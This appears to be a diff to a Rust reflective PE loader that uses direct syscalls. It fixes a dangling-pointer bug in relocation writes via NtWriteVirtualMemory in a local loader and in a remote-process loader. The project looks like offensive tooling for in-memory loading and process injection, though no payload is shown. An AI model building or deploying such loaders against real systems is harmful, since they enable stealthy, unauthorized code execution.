@@ -304,11 +304,12 @@ pub fn reflective_loader_syscalls(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
 
                             log::debug!("{:x?}", fixe_addr);
                             //Write into memory
+                            let fixed_addr_bytes = fixe_addr.to_ne_bytes();
                             status = syscall!(
                                 "NtWriteVirtualMemory",
                                 GetCurrentProcess(),
                                 block_reloc_rva as *mut c_void,
-                                fixe_addr.to_ne_bytes().as_ptr() as *mut c_void,
+                                fixed_addr_bytes.as_ptr() as *mut c_void,
                                 8,
                                 NULL
                             );
@@ -808,11 +809,12 @@ pub fn remote_loader_syscalls(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), B
 
                             log::debug!("{:x?}", fixe_addr);
                             //Write into memory
+                            let fixed_addr_bytes = fixe_addr.to_ne_bytes();
                             status = syscall!(
                                 "NtWriteVirtualMemory",
                                 prochandle,
                                 block_reloc_rva as *mut c_void,
-                                fixe_addr.to_ne_bytes().as_ptr() as *mut c_void,
+                                fixed_addr_bytes.as_ptr() as *mut c_void,
                                 8,
                                 NULL
                             );
